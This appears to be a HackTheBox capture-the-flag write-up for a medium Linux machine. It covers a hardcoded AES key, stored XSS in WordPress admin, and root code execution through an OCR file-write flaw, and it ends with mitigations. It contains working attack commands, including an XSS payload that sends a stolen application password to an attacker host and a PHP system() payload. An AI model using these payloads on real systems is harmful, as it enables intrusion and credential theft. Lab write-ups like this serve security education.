# 🏴 MakeSense — HTB Write-up

> **Difficulty:** Medium  
> **OS:** Linux  
> **Focus:** Web Application Security, Stored XSS, OCR-based Arbitrary File Write  
> **Key Takeaways:** Client-side encryption key exposure, WordPress REST API abuse, Tesseract OCR manipulation.

---

## 📋 Overview

MakeSense is a Linux-based machine that simulates an AI-powered agency website. The attack chain requires chaining multiple vulnerabilities:
1. Discovering a hardcoded encryption key in a client-side JavaScript file.
2. Exploiting a Stored XSS vulnerability in the WordPress admin panel by crafting and encrypting a malicious payload.
3. Using the compromised user's session to generate a WordPress Application Password.
4. Exploiting a local OCR (Optical Character Recognition) service to achieve Arbitrary File Write and execute code as `root`.

---

## 🔍 Phase 1: Reconnaissance

### Initial Enumeration
A standard Nmap scan reveals the typical web ports:
```bash
nmap -sC -sV -p- makesense.htb
```
- **22/tcp**: OpenSSH
- **80/tcp**: HTTP (Redirects to HTTPS)
- **443/tcp**: HTTPS (WordPress site)

### Web Enumeration
Browsing to `https://makesense.htb` reveals a custom WordPress theme named `webagency`. Inspecting the page source (`Ctrl+U`) and searching for JavaScript files reveals a custom script handling the "Voice AI" feature:

```bash
curl -sk https://makesense.htb/ | grep -i "js"
# Look for: /wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js
```

### The Critical Flaw
Downloading and inspecting `whisper-wrapper.js` reveals a hardcoded symmetric encryption key:
```javascript
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```
*Vulnerability:* The same key is used on the server-side to decrypt data. This allows an attacker to craft valid, encrypted payloads that the server will trust.

---

## 🚪 Phase 2: Initial Access (User)

### Understanding the Flow
The site has an AJAX endpoint (`/wp-admin/admin-ajax.php`) that handles form submissions. 
1. `action=submit_contact_form` creates a post and returns a `post_id`.
2. `action=save_voice_results` accepts an `encrypted_payload` containing a `transcription` and a `summary`.

The `summary` field is later displayed in the WordPress admin panel **without proper sanitization** (`esc_html` is missing), leading to Stored XSS.

### Step 1: Get a Valid `post_id`
```bash
NONCE=$(curl -sk https://makesense.htb/ | grep -oP 'nonce":"\K[^"]+')
curl -sk -X POST 'https://makesense.htb/wp-admin/admin-ajax.php' \
  --data-urlencode "action=submit_contact_form" \
  --data-urlencode "nonce=$NONCE" \
  --data-urlencode "name=Test" \
  --data-urlencode "email=test@test.com" \
  --data-urlencode "message=Test message"
# Note the returned "post_id" (e.g., 74)
```

### Step 2: Craft and Encrypt the XSS Payload
We need to encrypt a payload that creates a WordPress Application Password and exfiltrates it. We use a Python script (`encrypt_payload.py`) that mimics the JS `AES-GCM` logic (SHA-256 key derivation + 12-byte IV).

**Payload Logic:**
```javascript
fetch('/wp-json/wp/v2/users/me/application-passwords', { 
    method: 'POST', 
    credentials: 'include', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify({ name: 'backdoor' }) 
}).then(res => res.json()).then(data => { 
    fetch('http://<ATTACKER_IP>:8000/?pass=' + data.password); 
});
```

**Encrypt and Send:**
```bash
# Start listener to catch the password
python3 -m http.server 8000

# Encrypt the payload (using the custom Python script)
ENC=$(python3 encrypt_payload.py "test transcription" "fetch('/wp-json/wp/v2/users/me/application-passwords', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name: 'backdoor' }) }).then(res => res.json()).then(data => { fetch('http://<ATTACKER_IP>:8000/?pass=' + data.password); });")

# Send the encrypted payload (Note: --data-urlencode is crucial to prevent Base64 corruption)
curl -sk -X POST 'https://makesense.htb/wp-admin/admin-ajax.php' \
  -H "Origin: https://makesense.htb" \
  -H "Referer: https://makesense.htb/" \
  --data-urlencode "action=save_voice_results" \
  --data-urlencode "nonce=$NONCE" \
  --data-urlencode "post_id=74" \
  --data-urlencode "encrypted_payload=$ENC"
```

### Step 3: Catch the Credentials and Gain SSH Access
An automated bot (`walter`) visits the admin panel, triggering the XSS. The listener catches the request:
```text
10.129.x.x - - [DATE] "GET /?pass=walter:JbhHDAEgXvri3! HTTP/1.1" 200 -
```

Use these credentials to log in via SSH and retrieve the user flag:
```bash
ssh walter@makesense.htb
# Password: JbhHDAEgXvri3!
cat /home/walter/user.txt
```

---

## 👑 Phase 3: Privilege Escalation (Root)

### Local Service Discovery
Enumerating local services reveals a PHP development server running as `root` on port 8001:
```bash
ss -tlnp | grep 8001
# LISTEN 0 4096 127.0.0.1:8001 0.0.0.0:* users:(("php",pid=...,fd=...))
```

### Bypassing Basic Auth
The service requires Basic Authentication. Fortunately, it reuses `walter`'s credentials:
```bash
curl -i -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:8001/
```
This reveals an OCR (Optical Character Recognition) web application.

### The OCR Vulnerability
The application workflow is:
1. Accepts a Base64 encoded PNG image (`canvas_image`).
2. Uses Tesseract OCR to read the text from the image.
3. Allows the user to save the recognized text to a file in `/root/ocr4/saved/`.

*Vulnerability:* If we provide an image containing valid PHP code, the OCR will "read" it as text, and the application will save it as a `.php` file. Since the server runs as `root`, accessing this file will execute the code with root privileges.

### Step 1: Create the Malicious Image
Create an image (`payload.png`) with a **white background** and **large, bold, black text** containing:
```php
<?php system('cat /root/root.txt'); ?>
```
*(Tip: Use a tool like Python's Pillow or GIMP to ensure high contrast and sharp edges for Tesseract to read accurately).*

Convert it to a single-line Base64 string:
```bash
base64 -w 0 payload.png
```

### Step 2: Submit to OCR and Get `ocr_id`
```bash
B64="<YOUR_BASE64_STRING_HERE>"
FULL="data:image/png;base64,${B64}"

curl -s -u 'walter:JbhHDAEgXvri3!' -c jar.txt -b jar.txt \
  -X POST http://127.0.0.1:8001/ \
  --data-urlencode "canvas_image=${FULL}"
```
*Inspect the HTML response to find the hidden `ocr_id` value (e.g., `ocr_6ae4fd05467b53.01327017`).*

### Step 3: Save as PHP and Execute
Use the `ocr_id` to save the recognized text as a PHP file:
```bash
curl -s -u 'walter:JbhHDAEgXvri3!' -b jar.txt -c jar.txt \
  -X POST http://127.0.0.1:8001/ \
  -d "ocr_id=ocr_6ae4fd05467b53.01327017" \
  -d "filename=loot.php" \
  -d "save_output=Save"
```

Finally, trigger the payload to read the root flag:
```bash
curl -s -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:8001/saved/loot.php
```

**Output:**
```text
HTB{[REDACTED_ROOT_FLAG]}
```

---

## 🛡️ Mitigations (Defensive Perspective)

1. **Never hardcode secrets in client-side code.** Encryption keys meant for the server should never be shipped to the browser.
2. **Always sanitize and escape output.** WordPress provides `esc_html()` and `wp_kses()` for a reason. Never `echo` user-controlled data directly.
3. **Principle of Least Privilege.** The OCR service should not run as `root`, and the directory it writes to should not be web-accessible or executable.
4. **Validate File Extensions and Content.** If saving files, enforce strict whitelisting of extensions and validate that the content matches the expected file type.

---

<div align="center">

**Machine completed!** 💻🔒  
*Feel free to reach out if you have any questions about this write-up.*

</div>
